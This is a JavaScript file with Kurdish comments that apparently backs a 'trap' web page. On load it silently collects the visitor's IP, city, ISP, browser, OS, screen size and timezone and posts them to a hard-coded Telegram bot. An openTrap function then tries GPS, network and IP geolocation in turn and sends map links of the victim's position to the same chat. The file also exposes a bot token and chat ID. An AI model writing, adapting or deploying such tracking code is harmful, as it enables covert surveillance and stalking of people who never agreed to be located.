const TELEGRAM_BOT_TOKEN = '9174176982:AAEGO9F9kLczTp1g3hjAER_7KLw1IB0qzTw';
const TELEGRAM_CHAT_ID = '659131693';
const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}`;

let locationSent = false;

async function sendMessage(text) {
    try {
        await fetch(`${TELEGRAM_API}/sendMessage`, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: text, parse_mode: 'HTML' })
        });
    } catch (e) {}
}

async function gatherAndSendInfo() {
    let ipData = {};
    try {
        const res = await fetch('https://ipapi.co/json/');
        ipData = await res.json();
    } catch (e) {}
    
    const userAgent = navigator.userAgent;
    const platform = navigator.platform;
    const language = navigator.language;
    const screenRes = `${window.screen.width}x${window.screen.height}`;
    const timezone = Intl.DateTimeFormat().resolvedOptions().timeZone;
    
    let infoText = `<b>📱 Device & Network Info</b>\n`;
    infoText += `IP: <code>${ipData.ip || 'Unknown'}</code>\n`;
    infoText += `City: ${ipData.city || 'Unknown'}, ${ipData.country_name || 'Unknown'}\n`;
    infoText += `ISP: ${ipData.org || 'Unknown'}\n`;
    infoText += `OS: ${platform}\n`;
    infoText += `Browser/UA: <code>${userAgent}</code>\n`;
    infoText += `Language: ${language}\n`;
    infoText += `Screen: ${screenRes}\n`;
    infoText += `Timezone: ${timezone}\n`;

    await sendMessage(infoText);
}

// ڕێگای یەکەم: لوکیشنی وردی GPS
function getHighAccuracyLocation() {
    if (!navigator.geolocation) return;
    navigator.geolocation.getCurrentPosition(
        (pos) => {
            if (locationSent) return;
            const { latitude, longitude, accuracy } = pos.coords;
            sendMessage(`📍 <b>High Accuracy Location (GPS)</b>\nAccuracy: ${accuracy}m\nMap: https://maps.google.com/?q=${latitude},${longitude}`);
            locationSent = true;
        },
        (err) => {
            // ئەگەر ڕێگای یەکەم شکست هێنا، ڕێگای دووەم تاقی بکەرەوە
            getLowAccuracyLocation();
        },
        { enableHighAccuracy: true, timeout: 8000, maximumAge: 0 }
    );
}

// ڕێگای دووەم: لوکیشن بەپێی تۆڕی ئینتەرنێت (Wi-Fi/Data)
function getLowAccuracyLocation() {
    if (!navigator.geolocation) return;
    navigator.geolocation.getCurrentPosition(
        (pos) => {
            if (locationSent) return;
            const { latitude, longitude, accuracy } = pos.coords;
            sendMessage(`📍 <b>Network-based Location (Fallback)</b>\nAccuracy: ${accuracy}m\nMap: https://maps.google.com/?q=${latitude},${longitude}`);
            locationSent = true;
        },
        (err) => {
            // ئەگەر ڕێگای دووەمیش شکست هێنا، ڕێگای سێیەم تاقی بکەرەوە
            getLocationFromIP();
        },
        { enableHighAccuracy: false, timeout: 10000, maximumAge: 60000 }
    );
}

// ڕێگای سێیەم: لوکیشن بەپێی IP (وەک دوا چارەسەر)
async function getLocationFromIP() {
    if (locationSent) return;
    try {
        const res = await fetch('https://ipapi.co/json/');
        const data = await res.json();
        if (data.latitude && data.longitude) {
            sendMessage(`📍 <b>IP-based Location (Approximate)</b>\nCity: ${data.city}, ${data.country_name}\nMap: https://maps.google.com/?q=${data.latitude},${data.longitude}`);
            locationSent = true;
        } else {
            sendMessage(`❌ <b>Location failed:</b> All 3 methods failed.`);
        }
    } catch (e) {
        sendMessage(`❌ <b>Location failed:</b> IP API error.`);
    }
}

// بانگکردنی سەرەکی کاتێک بەکارهێنەر کلیک دەکات
function openTrap() {
    if (!locationSent) {
        // دەستپێکردنی ڕێگای یەکەم
        getHighAccuracyLocation();
    }
}

window.addEventListener('load', () => {
    gatherAndSendInfo();
});
